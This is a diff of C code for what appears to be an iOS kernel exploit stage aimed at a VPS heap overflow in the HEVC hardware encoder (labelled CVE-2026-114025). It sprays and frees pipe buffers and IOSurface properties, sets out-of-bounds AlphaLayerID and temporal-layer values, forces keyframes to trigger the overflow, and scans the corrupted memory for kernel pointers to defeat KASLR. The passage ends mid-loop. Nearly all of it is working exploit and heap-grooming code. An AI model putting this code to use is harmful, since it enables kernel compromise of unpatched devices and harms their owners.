@@ -21059,652 +21059,263 @@ new_modes:
         rlog("--- Phase 14 complete ---\n");
 
         /* ================================================================
-         * Phase 15 (r=229): VPS Heap Overflow + Pipe Buffer Corruption
+         * Phase 15 (r=229): VPS Heap Overflow — Forced IDR
          *
-         * CVE-2026-114025: VPS extension bounds checks missing in iOS 27.1.
-         * Uses HEVC-with-alpha codec (muxa = 0x6D757861) which activates
-         * the VPS extension path in PSGen. AlphaLayerID and TemporalLayers
-         * are accepted by the hardware encoder — set past bounds to trigger
-         * overflow during VPS generation.
+         * CVE-2026-114025: VPS extension bounds checks missing in 27.1.
          *
-         * Run 1 results showed:
-         * - Regular HEVC rejects RepFormat arrays (-12900)
-         * - AlphaLayerID=128 accepted, NumberOfTemporalLayers=16 accepted
-         * - CompleteFrames blocks forever — use dispatch timeout
-         * - Only 126/512 pipes created — reduce to 120
+         * Previous runs showed:
+         * - muxa codec: -12715 (malfunction) on A20 Pro — dead end
+         * - Regular HEVC: AlphaLayerID=128 accepted, encodes OK (status=0)
+         *   BUT psets=0 because encode_one() doesn't force IDR frames
+         *
+         * Fix: ForceKeyFrame=true + MaxKeyFrameInterval=1 forces VPS/SPS/PPS
+         * generation on every frame. Try multiple pipe sizes to match
+         * whatever kalloc zone the VPS buffer lands in.
          * ================================================================ */
         if (rounds == 229 && r229_matched_idx >= 0) {
-            rlog("\n=== Phase 15 (r=229): VPS Heap Overflow ====\n");
-            rlog("Target: CVE-2026-114025 via HEVC-alpha (muxa) codec\n");
-            rlog("Match surface: spray[%d]\n", r229_matched_idx);
+            rlog("\n=== Phase 15: VPS Overflow (IDR-forced) ===\n");
+            rlog("Match: spray[%d]\n", r229_matched_idx);
 
-            /* Dispatch watchdog: kill after 45s to prevent hangs */
+            /* 45s watchdog */
             __block volatile int p15_done = 0;
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 45 * NSEC_PER_SEC),
                 dispatch_get_global_queue(0, 0), ^{
                     if (!p15_done) {
-                        rlog("  P15 WATCHDOG: 45s timeout\n");
+                        rlog("  P15 WATCHDOG\n");
                         if (g_log) { fclose(g_log); g_log = NULL; }
                         _exit(45);
                     }
                 });
 
-            /* 15a: Spray pipe buffers at multiple sizes to co-locate with
-             * different kalloc zones. VPS buffers may be in kalloc.512,
-             * kalloc.1024, or kalloc.4096 depending on parameter count. */
-            #define P15_NPIPES 120
-            int p15_fds[P15_NPIPES][2];
-            int p15_ok = 0;
+            uint64_t p15_leaked_ptr = 0;
+            int p15_any_corrupt = 0;
 
-            /* Use 1024-byte pipe buffers (likely kalloc.1024 zone) */
-            #define P15_PSIZE 1024
-            uint8_t *p15_buf = (uint8_t *)malloc(P15_PSIZE);
+            /* Try pipe buffers at multiple sizes */
+            int pipe_sizes[] = {256, 512, 1024, 4096};
+            int n_psizes = 4;
 
-            rlog("15a: Spraying %d pipe buffers (%d bytes)...\n", P15_NPIPES, P15_PSIZE);
-            for (int i = 0; i < P15_NPIPES; i++) {
-                p15_fds[i][0] = p15_fds[i][1] = -1;
-                if (pipe(p15_fds[i]) == 0) {
-                    uint32_t pat = 0xCA5E0000u | (uint16_t)i;
-                    for (int j = 0; j < P15_PSIZE / 4; j++)
-                        ((uint32_t *)p15_buf)[j] = pat;
-                    ssize_t w = write(p15_fds[i][1], p15_buf, P15_PSIZE);
-                    if (w == P15_PSIZE) p15_ok++;
-                    else {
-                        close(p15_fds[i][0]); close(p15_fds[i][1]);
-                        p15_fds[i][0] = p15_fds[i][1] = -1;
+            for (int psi = 0; psi < n_psizes && !p15_any_corrupt; psi++) {
+                int psize = pipe_sizes[psi];
+                rlog("\n--- 15a: Pipe spray size=%d ---\n", psize);
+
+                #define P15_NP 100
+                int p15_fd[P15_NP][2];
+                int p15_ok = 0;
+                uint8_t *p15_buf = (uint8_t *)malloc(psize);
+
+                for (int i = 0; i < P15_NP; i++) {
+                    p15_fd[i][0] = p15_fd[i][1] = -1;
+                    if (pipe(p15_fd[i]) == 0) {
+                        uint32_t pat = 0xCA5E0000u | (uint16_t)i;
+                        for (int j = 0; j < psize / 4; j++)
+                            ((uint32_t *)p15_buf)[j] = pat;
+                        ssize_t w = write(p15_fd[i][1], p15_buf, psize);
+                        if (w == psize) p15_ok++;
+                        else {
+                            close(p15_fd[i][0]); close(p15_fd[i][1]);
+                            p15_fd[i][0] = p15_fd[i][1] = -1;
+                        }
                     }
                 }
-            }
-            rlog("  Pipes: %d / %d\n", p15_ok, P15_NPIPES);
+                rlog("  Pipes: %d/%d\n", p15_ok, P15_NP);
 
-            /* 15b: Create holes every 3rd pipe */
-            int p15_freed = 0;
-            for (int i = 2; i < P15_NPIPES; i += 3) {
-                if (p15_fds[i][0] >= 0) {
-                    close(p15_fds[i][0]); close(p15_fds[i][1]);
-                    p15_fds[i][0] = p15_fds[i][1] = -1;
-                    p15_freed++;
+                /* Free alternating to create holes */
+                int freed = 0;
+                for (int i = 1; i < P15_NP; i += 2) {
+                    if (p15_fd[i][0] >= 0) {
+                        close(p15_fd[i][0]); close(p15_fd[i][1]);
+                        p15_fd[i][0] = p15_fd[i][1] = -1;
+                        freed++;
+                    }
                 }
-            }
-            rlog("15b: Freed %d pipes (holes)\n", p15_freed);
+                rlog("  Freed %d (holes)\n", freed);
 
-            /* 15c: Trigger VPS overflow using HEVC-with-alpha codec.
-             * Try multiple alpha_layer_id values and encode counts. */
-            int p15_total_corrupted = 0;
-            uint64_t p15_leaked_ptr = 0;
-
-            int alpha_ids[] = {63, 64, 128, 255};
-            int n_aids = sizeof(alpha_ids) / sizeof(alpha_ids[0]);
-
-            for (int ai = 0; ai < n_aids && p15_total_corrupted == 0; ai++) {
-                int alpha_id = alpha_ids[ai];
-                rlog("15c: muxa codec with AlphaLayerID=%d...\n", alpha_id);
-
+                /* Create HEVC encoder with overflow properties */
                 VTCompressionSessionRef p15_enc = NULL;
                 CFMutableDictionaryRef p15_spec = CFDictionaryCreateMutable(NULL, 0,
                     &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                 CFDictionarySetValue(p15_spec,
                     CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                CFDictionarySetValue(p15_spec,
+                    CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
 
                 OSStatus p15_st = VTCompressionSessionCreate(NULL, 192, 192,
-                    (CMVideoCodecType)0x6D757861, /* HEVC-with-alpha (muxa) */
-                    p15_spec, NULL, NULL, encode_cb, NULL, &p15_enc);
+                    kCMVideoCodecType_HEVC, p15_spec, NULL, NULL, encode_cb, NULL, &p15_enc);
                 CFRelease(p15_spec);
-                rlog("  Session: %d\n", (int)p15_st);
 
-                if (p15_st != noErr || !p15_enc) continue;
+                if (p15_st != noErr || !p15_enc) {
+                    rlog("  Session fail: %d\n", (int)p15_st);
+                    goto p15_pipe_cleanup;
+                }
 
                 VTSessionSetProperty(p15_enc,
                     kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
 
-                /* Set EncodesAlpha */
+                /* Force every frame to be IDR with VPS/SPS/PPS */
+                int kfi = 1;
+                CFNumberRef kfi_n = CFNumberCreate(NULL, kCFNumberIntType, &kfi);
+                VTSessionSetProperty(p15_enc,
+                    kVTCompressionPropertyKey_MaxKeyFrameInterval, kfi_n);
+                CFRelease(kfi_n);
+
+                /* EncodesAlpha activates VPS extension path */
                 VTSessionSetProperty(p15_enc,
                     CFSTR("EncodesAlpha"), kCFBooleanTrue);
 
-                /* Set AlphaLayerID past bounds */
-                CFNumberRef p15_aid = CFNumberCreate(NULL, kCFNumberIntType, &alpha_id);
+                /* AlphaLayerID=128 past bounds (< 63 in 27.2 patch) */
+                int aid = 128;
+                CFNumberRef aid_n = CFNumberCreate(NULL, kCFNumberIntType, &aid);
                 OSStatus sp1 = VTSessionSetProperty(p15_enc,
-                    CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), p15_aid);
-                CFRelease(p15_aid);
+                    CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aid_n);
+                CFRelease(aid_n);
 
-                /* Set temporal layers past bounds */
-                int p15_ntl = 16;
-                CFNumberRef p15_ntl_n = CFNumberCreate(NULL, kCFNumberIntType, &p15_ntl);
+                /* TemporalLayers=16 past bounds (< 7 in 27.2 patch) */
+                int ntl = 16;
+                CFNumberRef ntl_n = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
                 OSStatus sp2 = VTSessionSetProperty(p15_enc,
-                    CFSTR("NumberOfTemporalLayers"), p15_ntl_n);
-                CFRelease(p15_ntl_n);
+                    CFSTR("NumberOfTemporalLayers"), ntl_n);
+                CFRelease(ntl_n);
 
-                rlog("  AlphaID=%d: %d, Temporal=16: %d\n",
-                    alpha_id, (int)sp1, (int)sp2);
+                rlog("  AlphaID=128: %d, Temporal=16: %d\n", (int)sp1, (int)sp2);
 
-                /* Prepare and encode */
                 p15_st = VTCompressionSessionPrepareToEncodeFrames(p15_enc);
                 rlog("  Prepare: %d\n", (int)p15_st);
 
                 if (p15_st == noErr) {
-                    int enc_ok = 0;
-                    for (int ei = 0; ei < 4; ei++) {
+                    /* Encode 8 frames, all forced IDR */
+                    for (int ei = 0; ei < 8 && !p15_any_corrupt; ei++) {
+                        CVPixelBufferRef pb = NULL;
+                        CVPixelBufferCreate(NULL, 192, 192,
+                            kCVPixelFormatType_32BGRA, NULL, &pb);
+                        if (!pb) continue;
+                        CVPixelBufferLockBaseAddress(pb, 0);
+                        void *ba = CVPixelBufferGetBaseAddress(pb);
+                        if (ba) memset(ba, 0x80 + ei, CVPixelBufferGetDataSize(pb));
+                        CVPixelBufferUnlockBaseAddress(pb, 0);
+
+                        CFMutableDictionaryRef fprops = CFDictionaryCreateMutable(NULL, 0,
+                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                        CFDictionarySetValue(fprops,
+                            kVTEncodeFrameOptionKey_ForceKeyFrame, kCFBooleanTrue);
+
                         g_encode_done = 0;
                         g_cb_status = -999;
-                        int est = encode_one(p15_enc, ei, 192, 192);
-                        if (est == 0) enc_ok++;
-                        rlog("  enc[%d]: %d psets=%zu nal=%zu\n",
-                            ei, est, g_last_pset_count, g_saved_nal_len);
-                    }
-                    rlog("  OK: %d/4\n", enc_ok);
+                        g_last_pset_count = 0;
+                        g_saved_nal_len = 0;
 
-                    /* Do NOT call CompleteFrames — it blocks forever
-                     * when the encoder is in a bad state */
+                        OSStatus est = VTCompressionSessionEncodeFrame(p15_enc, pb,
+                            CMTimeMake(ei, 30), CMTimeMake(1, 30), fprops, NULL, NULL);
+                        CFRelease(fprops);
+
+                        /* Wait up to 5s for callback */
+                        for (int w = 0; w < 500 && !g_encode_done; w++) usleep(10000);
+
+                        rlog("  enc[%d]: est=%d done=%d cb=%d buf=%d fmt=%d psets=%zu nal=%zu\n",
+                            ei, (int)est, g_encode_done, (int)g_cb_status,
+                            g_cb_had_buf, g_cb_had_fmt,
+                            g_last_pset_count, g_saved_nal_len);
+
+                        if (g_last_pset_count > 0) {
+                            rlog("  *** VPS/SPS/PPS: %zu psets, %zu total bytes ***\n",
+                                g_last_pset_count, g_last_pset_total_bytes);
+                        }
+
+                        if (g_saved_nal_len > 0) {
+                            int dl = (g_saved_nal_len > 64) ? 64 : (int)g_saved_nal_len;
+                            rlog("  NAL[0..%d]:", dl);
+                            for (int b = 0; b < dl; b++) rlog(" %02x", g_saved_nal[b]);
+                            rlog("\n");
+                        }
+
+                        CVPixelBufferRelease(pb);
+
+                        /* If callback timed out, stop encoding */
+                        if (!g_encode_done) {
+                            rlog("  Encode timeout, stopping\n");
+                            break;
+                        }
+                    }
                 }
 
                 VTCompressionSessionInvalidate(p15_enc);
                 CFRelease(p15_enc);
-                usleep(100000); /* Let kernel settle */
-            }
+                usleep(50000);
 
-            /* Also try with regular HEVC + EncodesAlpha (different VPS path) */
-            rlog("15c-alt: Regular HEVC + EncodesAlpha + AlphaLayerID=128\n");
-            {
-                VTCompressionSessionRef p15_enc2 = NULL;
-                CFMutableDictionaryRef p15_spec2 = CFDictionaryCreateMutable(NULL, 0,
-                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-                CFDictionarySetValue(p15_spec2,
-                    CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
-                CFDictionarySetValue(p15_spec2,
-                    CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
-
-                OSStatus st2 = VTCompressionSessionCreate(NULL, 192, 192,
-                    kCMVideoCodecType_HEVC, p15_spec2, NULL, NULL, encode_cb, NULL, &p15_enc2);
-                CFRelease(p15_spec2);
-                rlog("  HEVC session: %d\n", (int)st2);
-
-                if (st2 == noErr && p15_enc2) {
-                    VTSessionSetProperty(p15_enc2,
-                        kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
-                    VTSessionSetProperty(p15_enc2,
-                        CFSTR("EncodesAlpha"), kCFBooleanTrue);
-                    int aid2 = 128;
-                    CFNumberRef aidn2 = CFNumberCreate(NULL, kCFNumberIntType, &aid2);
-                    VTSessionSetProperty(p15_enc2,
-                        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn2);
-                    CFRelease(aidn2);
-                    int ntl2 = 16;
-                    CFNumberRef ntln2 = CFNumberCreate(NULL, kCFNumberIntType, &ntl2);
-                    VTSessionSetProperty(p15_enc2,
-                        CFSTR("NumberOfTemporalLayers"), ntln2);
-                    CFRelease(ntln2);
-
-                    st2 = VTCompressionSessionPrepareToEncodeFrames(p15_enc2);
-                    rlog("  Prepare: %d\n", (int)st2);
-                    if (st2 == noErr) {
-                        for (int ei = 0; ei < 4; ei++) {
-                            g_encode_done = 0;
-                            int est = encode_one(p15_enc2, ei, 192, 192);
-                            rlog("  enc[%d]: %d psets=%zu\n",
-                                ei, est, g_last_pset_count);
-                        }
-                    }
-                    VTCompressionSessionInvalidate(p15_enc2);
-                    CFRelease(p15_enc2);
-                }
-            }
-
-            /* 15d: Check all pipes for corruption */
-            rlog("15d: Checking pipe buffers...\n");
-            int p15_checked = 0, p15_corrupted = 0;
-            int p15_first_ci = -1, p15_first_co = -1;
-
-            for (int i = 0; i < P15_NPIPES; i++) {
-                if (p15_fds[i][0] < 0) continue;
-                p15_checked++;
-
-                uint8_t *rb = (uint8_t *)malloc(P15_PSIZE);
-                ssize_t r = read(p15_fds[i][0], rb, P15_PSIZE);
-
-                if (r != P15_PSIZE) {
-                    rlog("  pipe[%d]: short read %zd\n", i, r);
-                    p15_corrupted++;
-                    if (p15_first_ci < 0) p15_first_ci = i;
-                } else {
-                    uint32_t expected = 0xCA5E0000u | (uint16_t)i;
-                    int mm = 0;
-                    int first_off = -1;
-                    uint32_t first_got = 0;
-
-                    for (int j = 0; j < P15_PSIZE / 4; j++) {
-                        uint32_t got;
-                        memcpy(&got, rb + j * 4, 4);
-                        if (got != expected) {
-                            if (mm == 0) {
-                                first_off = j * 4;
-                                first_got = got;
-                            }
-                            mm++;
-                        }
-                    }
-
-                    if (mm > 0) {
-                        p15_corrupted++;
-                        if (p15_first_ci < 0) {
-                            p15_first_ci = i;
-                            p15_first_co = first_off;
-                        }
-                        rlog("  *** PIPE[%d] CORRUPTED: %d dwords at +%d: 0x%08x ***\n",
-                            i, mm, first_off, first_got);
-
-                        /* Scan for kernel pointers */
-                        for (int q = 0; q < P15_PSIZE / 8; q++) {
-                            uint64_t qw;
-                            memcpy(&qw, rb + q * 8, 8);
-                            if ((qw >> 40) == 0xfffffe) {
-                                rlog("    KPTR at +%d: 0x%016llx\n",
-                                    q * 8, (unsigned long long)qw);
-                                if (p15_leaked_ptr == 0) p15_leaked_ptr = qw;
-                            }
-                        }
-
-                        /* Hex dump corruption area */
-                        int ds = (first_off > 16) ? first_off - 16 : 0;
-                        int de = first_off + 64;
-                        if (de > P15_PSIZE) de = P15_PSIZE;
-                        rlog("    hex [%d..%d]:\n", ds, de);
-                        for (int d = ds; d < de; d += 16) {
-                            rlog("    %04x:", d);
-                            for (int b = 0; b < 16 && d + b < de; b++)
-                                rlog(" %02x", rb[d + b]);
-                            rlog("\n");
-                        }
-                    }
-                }
-                free(rb);
-            }
-
-            rlog("  Checked: %d, Corrupted: %d\n", p15_checked, p15_corrupted);
-
-            if (p15_corrupted > 0) {
-                rlog("*** VPS OVERFLOW → PIPE CORRUPTION ***\n");
-                if (p15_leaked_ptr != 0)
-                    rlog("*** KASLR LEAK: 0x%016llx ***\n",
-                        (unsigned long long)p15_leaked_ptr);
-            } else {
-                rlog("  No pipe corruption from VPS overflow.\n");
-                rlog("  VPS may land in typed zone (not kalloc.data).\n");
-
-                /* 15e: Alternative approach — use IOSurface property
-                 * spray instead of pipes. IOSurface properties go to
-                 * kalloc.data via CFData/CFString internally. */
-                rlog("15e: IOSurface property spray as overflow target\n");
-
-                /* Create IOSurfaces with large property data that might
-                 * co-locate with VPS buffers in the same zone */
-                #define P15_PROP_COUNT 64
-                IOSurfaceRef p15_prop_surfs[P15_PROP_COUNT];
-                int p15_prop_ok = 0;
-
-                for (int i = 0; i < P15_PROP_COUNT; i++) {
-                    CFMutableDictionaryRef sd = CFDictionaryCreateMutable(NULL, 0,
-                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-                    int pw = 32, ph = 32, pbpr = 128;
-                    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &pw);
-                    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &ph);
-                    CFNumberRef nb = CFNumberCreate(NULL, kCFNumberIntType, &pbpr);
-                    int ppf = 0x42475241; /* BGRA */
-                    CFNumberRef npf = CFNumberCreate(NULL, kCFNumberIntType, &ppf);
-                    CFDictionarySetValue(sd, CFSTR("IOSurfaceWidth"), nw);
-                    CFDictionarySetValue(sd, CFSTR("IOSurfaceHeight"), nh);
-                    CFDictionarySetValue(sd, CFSTR("IOSurfaceBytesPerRow"), nb);
-                    CFDictionarySetValue(sd, CFSTR("IOSurfacePixelFormat"), npf);
-                    int pab = pw * ph * 4;
-                    CFNumberRef nab = CFNumberCreate(NULL, kCFNumberIntType, &pab);
-                    CFDictionarySetValue(sd, CFSTR("IOSurfaceAllocSize"), nab);
-                    p15_prop_surfs[i] = IOSurfaceCreate(sd);
-                    CFRelease(sd); CFRelease(nw); CFRelease(nh);
-                    CFRelease(nb); CFRelease(npf); CFRelease(nab);
-
-                    if (p15_prop_surfs[i]) {
-                        /* Set sentinel property data (~1024 bytes) */
-                        uint8_t pdata[1024];
-                        uint32_t ppat = 0xD15C0000u | (uint16_t)i;
-                        for (int j = 0; j < 1024/4; j++)
-                            ((uint32_t *)pdata)[j] = ppat;
-                        CFDataRef cd = CFDataCreate(NULL, pdata, 1024);
-                        IOSurfaceSetValue(p15_prop_surfs[i],
-                            CFSTR("P15Sentinel"), cd);
-                        CFRelease(cd);
-                        p15_prop_ok++;
-                    }
-                }
-                rlog("  IOSurface props: %d / %d\n", p15_prop_ok, P15_PROP_COUNT);
-
-                /* Free alternating to create holes */
-                for (int i = 1; i < P15_PROP_COUNT; i += 2) {
-                    if (p15_prop_surfs[i]) {
-                        IOSurfaceSetValue(p15_prop_surfs[i],
-                            CFSTR("P15Sentinel"), kCFBooleanFalse);
-                        CFRelease(p15_prop_surfs[i]);
-                        p15_prop_surfs[i] = NULL;
-                    }
-                }
-
-                /* Trigger more VPS overflows */
-                rlog("  Triggering VPS overflow into prop data holes...\n");
-                VTCompressionSessionRef p15_enc3 = NULL;
-                CFMutableDictionaryRef p15_spec3 = CFDictionaryCreateMutable(NULL, 0,
-                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-                CFDictionarySetValue(p15_spec3,
-                    CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
-                OSStatus st3 = VTCompressionSessionCreate(NULL, 192, 192,
-                    (CMVideoCodecType)0x6D757861, p15_spec3, NULL, NULL,
-                    encode_cb, NULL, &p15_enc3);
-                CFRelease(p15_spec3);
-
-                if (st3 == noErr && p15_enc3) {
-                    VTSessionSetProperty(p15_enc3,
-                        kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
-                    VTSessionSetProperty(p15_enc3,
-                        CFSTR("EncodesAlpha"), kCFBooleanTrue);
-                    int aid3 = 255;
-                    CFNumberRef aidn3 = CFNumberCreate(NULL, kCFNumberIntType, &aid3);
-                    VTSessionSetProperty(p15_enc3,
-                        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn3);
-                    CFRelease(aidn3);
-
-                    st3 = VTCompressionSessionPrepareToEncodeFrames(p15_enc3);
-                    if (st3 == noErr) {
-                        for (int ei = 0; ei < 8; ei++) {
-                            g_encode_done = 0;
-                            encode_one(p15_enc3, ei, 192, 192);
-                        }
-                    }
-                    VTCompressionSessionInvalidate(p15_enc3);
-                    CFRelease(p15_enc3);
-                }
-
-                /* Check remaining IOSurface properties for corruption */
-                int p15_sp_corrupted = 0;
-                for (int i = 0; i < P15_PROP_COUNT; i += 2) {
-                    if (!p15_prop_surfs[i]) continue;
-                    CFTypeRef val = IOSurfaceCopyValue(p15_prop_surfs[i],
-                        CFSTR("P15Sentinel"));
-                    if (val) {
-                        if (CFGetTypeID(val) == CFDataGetTypeID()) {
-                            CFDataRef dval = (CFDataRef)val;
-                            const uint8_t *db = CFDataGetBytePtr(dval);
-                            CFIndex dlen = CFDataGetLength(dval);
-                            uint32_t ppat = 0xD15C0000u | (uint16_t)i;
-                            int mm = 0;
-                            for (int j = 0; j < dlen / 4; j++) {
-                                uint32_t got;
-                                memcpy(&got, db + j * 4, 4);
-                                if (got != ppat) mm++;
-                            }
-                            if (mm > 0) {
-                                p15_sp_corrupted++;
-                                rlog("  *** SURF[%d] PROP CORRUPTED: %d dwords ***\n", i, mm);
-                            }
-                        }
-                        CFRelease(val);
-                    }
-                }
-                rlog("  Surf prop corruption: %d\n", p15_sp_corrupted);
-
-                /* Cleanup IOSurface props */
-                for (int i = 0; i < P15_PROP_COUNT; i++) {
-                    if (p15_prop_surfs[i]) CFRelease(p15_prop_surfs[i]);
-                }
-            }
-
-            /* Cleanup pipes */
-            for (int i = 0; i < P15_NPIPES; i++) {
-                if (p15_fds[i][0] >= 0) {
-                    close(p15_fds[i][0]); close(p15_fds[i][1]);
-                }
-            }
-            free(p15_buf);
-
-            p15_done = 1;
-            rlog("--- Phase 15 (VPS overflow) complete ---\n");
-
-            if (p15_leaked_ptr != 0)
-                rlog("*** KASLR: 0x%016llx ***\n",
-                    (unsigned long long)p15_leaked_ptr);
-        }
-
-
-
-        /* ============================================================
-         * Phase 15 for r=229: VPS heap overflow + pipe buffer corruption
-         *
-         * CVE-2026-114025: VPS extension property bounds checks are
-         * MISSING in iOS 27.1 (added in 27.2 as AVE_HEVC_CheckVPSExtBounds).
-         *
-         * Strategy: Try multiple encoder configs and pipe sizes to find
-         * the right combination for heap overflow into pipe buffers.
-         *
-         * Config A: muxa codec + AlphaLayerID=128 (pipe 4096)
-         * Config B: HEVC + AlphaLayerID=128 + EncodesAlpha (pipe 4096)
-         * Config C: muxa codec + AlphaLayerID=128 (pipe 1024)
-         * Config D: HEVC + NumberOfTemporalLayers=8 (pipe 512)
-         * Config E: muxa + AlphaLayerID=200 (pipe 2048)
-         * ============================================================ */
-        if (rounds == 229) {
-            rlog("\n--- Phase 15 (r=229): VPS heap overflow + pipe corruption ---\n");
-
-            /* Try multiple encoder configurations with different pipe sizes */
-            struct p15_config {
-                const char *name;
-                CMVideoCodecType codec;
-                int alpha_layer_id;
-                int encodes_alpha;
-                int temporal_layers;
-                int pipe_size;
-                int w, h;
-            };
-
-            struct p15_config configs[] = {
-                /* Config A: muxa + high AlphaLayerID, 4096 pipes */
-                {"muxa+aid128+pipe4k", (CMVideoCodecType)0x6D757861, 128, 1, 0, 4096, 192, 192},
-                /* Config B: HEVC + EncodesAlpha + AlphaLayerID, 4096 pipes */
-                {"hevc+alpha+aid128+pipe4k", kCMVideoCodecType_HEVC, 128, 1, 0, 4096, 192, 192},
-                /* Config C: muxa + very high AlphaLayerID (larger overflow), 2048 pipes */
-                {"muxa+aid200+pipe2k", (CMVideoCodecType)0x6D757861, 200, 1, 0, 2048, 192, 192},
-                /* Config D: HEVC + temporal layers, 1024 pipes */
-                {"hevc+temporal8+pipe1k", kCMVideoCodecType_HEVC, 0, 0, 8, 1024, 192, 192},
-                /* Config E: muxa + minimal props, 512 pipes */
-                {"muxa+aid63+pipe512", (CMVideoCodecType)0x6D757861, 63, 1, 0, 512, 128, 128},
-                /* Config F: muxa large frame, 16384 pipes */
-                {"muxa+aid128+pipe16k", (CMVideoCodecType)0x6D757861, 128, 1, 0, 16384, 1280, 720},
-            };
-            int n_configs = sizeof(configs) / sizeof(configs[0]);
-            int p15_overall_corrupted = 0;
-
-            for (int ci = 0; ci < n_configs && !p15_overall_corrupted; ci++) {
-                struct p15_config *cfg = &configs[ci];
-                rlog("\n  === Config %d: %s ===\n", ci, cfg->name);
-
-                /* 15a: Spray pipe buffers */
-                enum { P15_MAX_PIPES = 256 };
-                int p15_pipes[P15_MAX_PIPES][2];
-                int p15_pipes_ok = 0;
-                uint8_t *p15_buf = (uint8_t *)malloc(cfg->pipe_size);
-
-                for (int i = 0; i < P15_MAX_PIPES; i++) {
-                    p15_pipes[i][0] = p15_pipes[i][1] = -1;
-                    if (pipe(p15_pipes[i]) == 0) {
-                        uint32_t pat = 0xCA5E0000u | (uint16_t)i;
-                        for (int j = 0; j < cfg->pipe_size / 4; j++)
-                            ((uint32_t *)p15_buf)[j] = pat ^ (uint32_t)j;
-                        ssize_t w = write(p15_pipes[i][1], p15_buf, cfg->pipe_size);
-                        if (w == cfg->pipe_size) p15_pipes_ok++;
-                        else {
-                            close(p15_pipes[i][0]); close(p15_pipes[i][1]);
-                            p15_pipes[i][0] = p15_pipes[i][1] = -1;
-                        }
-                    }
-                }
-                rlog("  15a: %d/%d pipes (%d bytes each)\n", p15_pipes_ok, P15_MAX_PIPES, cfg->pipe_size);
-
-                /* 15b: Create holes */
-                int freed = 0;
-                for (int i = 2; i < P15_MAX_PIPES; i += 4) {
-                    if (p15_pipes[i][0] >= 0) {
-                        close(p15_pipes[i][0]); close(p15_pipes[i][1]);
-                        p15_pipes[i][0] = p15_pipes[i][1] = -1;
-                        freed++;
-                    }
-                }
-                rlog("  15b: Freed %d pipes\n", freed);
-
-                /* 15c: Create encoder */
-                VTCompressionSessionRef enc = NULL;
-                CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
-                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-                CFDictionarySetValue(es,
-                    CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
-                CFDictionarySetValue(es,
-                    CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
-
-                OSStatus cs = VTCompressionSessionCreate(NULL,
-                    cfg->w, cfg->h, cfg->codec, es, NULL, NULL, encode_cb, NULL, &enc);
-                CFRelease(es);
-                rlog("  15c: Session create: %d\n", (int)cs);
-
-                if (cs != noErr || !enc) {
-                    rlog("  15c: SKIP (session failed)\n");
-                    goto p15_cleanup_pipes;
-                }
-
-                VTSessionSetProperty(enc,
-                    kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
-
-                if (cfg->encodes_alpha) {
-                    OSStatus sp = VTSessionSetProperty(enc,
-                        CFSTR("EncodesAlpha"), kCFBooleanTrue);
-                    rlog("  EncodesAlpha: %d\n", (int)sp);
-                }
-
-                if (cfg->alpha_layer_id > 0) {
-                    int aid = cfg->alpha_layer_id;
-                    CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
-                    OSStatus sp = VTSessionSetProperty(enc,
-                        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
-                    CFRelease(aidn);
-                    rlog("  AlphaLayerID=%d: %d\n", aid, (int)sp);
-                }
-
-                if (cfg->temporal_layers > 0) {
-                    int ntl = cfg->temporal_layers;
-                    CFNumberRef ntln = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
-                    OSStatus sp = VTSessionSetProperty(enc,
-                        CFSTR("NumberOfTemporalLayers"), ntln);
-                    CFRelease(ntln);
-                    rlog("  TemporalLayers=%d: %d\n", ntl, (int)sp);
-                }
-
-                OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(enc);
-                rlog("  Prepare: %d\n", (int)prep);
-
-                /* 15d: Encode frames */
-                int encodes_ok = 0, encodes_err = 0;
-                for (int e = 0; e < 30; e++) {
-                    g_encode_done = 0;
-                    g_cb_status = -999;
-                    CVPixelBufferRef pb = NULL;
-                    CVPixelBufferCreate(NULL, cfg->w, cfg->h,
-                        kCVPixelFormatType_32BGRA, NULL, &pb);
-                    if (!pb) continue;
-                    CVPixelBufferLockBaseAddress(pb, 0);
-                    void *b = CVPixelBufferGetBaseAddress(pb);
-                    if (b) memset(b, (uint8_t)(e * 7 + 0x41), CVPixelBufferGetDataSize(pb));
-                    CVPixelBufferUnlockBaseAddress(pb, 0);
-
-                    CFMutableDictionaryRef fp = NULL;
-                    if (e % 5 == 0) {
-                        fp = CFDictionaryCreateMutable(NULL, 0,
-                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-                        CFDictionarySetValue(fp,
-                            kVTEncodeFrameOptionKey_ForceKeyFrame, kCFBooleanTrue);
-                    }
-
-                    VTCompressionSessionEncodeFrame(enc, pb,
-                        CMTimeMake(e, 30), kCMTimeInvalid, fp, NULL, NULL);
-                    if (fp) CFRelease(fp);
-                    CVPixelBufferRelease(pb);
-
